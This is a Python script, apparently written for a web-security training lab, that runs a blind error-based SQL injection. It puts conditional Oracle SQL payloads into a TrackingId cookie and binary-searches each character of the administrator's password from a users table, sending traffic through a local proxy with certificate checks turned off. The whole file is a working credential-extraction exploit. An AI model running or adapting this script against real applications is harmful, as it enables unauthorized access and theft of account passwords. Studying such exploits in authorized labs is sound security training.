import sys;import requests;import urllib;import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
host = sys.argv[1]
length=20


list = range(48, 123)

def checkThisChr(index, encChr):
    enc_payload = urllib.parse.quote(("PCO7fW7Rsmb7N8rn' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, %d, 1) > '%s') THEN 'b' ELSE to_char(1/0) END FROM users WHERE ROWNUM = 1)='a' --" %(index, chr(encChr))))
    cookies = {'TrackingId': enc_payload, 'session': "WMiX0WR68TM4Z3owLbwEw4nsR73r4frK"}
    response = requests.get(host, cookies=cookies, verify=False, proxies=proxies)
    #sys.stdout.write('\r' + password + chr(encChr))
    #sys.stdout.flush()
    if response.status_code == 200:
        return True
    else:
        return False

def findCrctChr(index):
    e = len(list) - 1
    s = 0
    while e > s:
        mid = s + int((e - s)/2)
        isGrtr = checkThisChr(index, list[mid])
        if isGrtr:
            s = mid + 1 
        else:
            e = mid
    return chr(list[s])

def main(): 
    password = ""
    length = 20

    if len(sys.argv) < 2:
        print("usage: $ python3 script_binsrch.py <lab url> ")
        exit(0)

    sys.stdout.write("Finding the administrator password...\n\n")
    for i in range(1, length+1): 
        password += findCrctChr(i)
    sys.stdout.write("\nadmin password is %s\n" %(password))

if __name__ == "__main__":
    main()
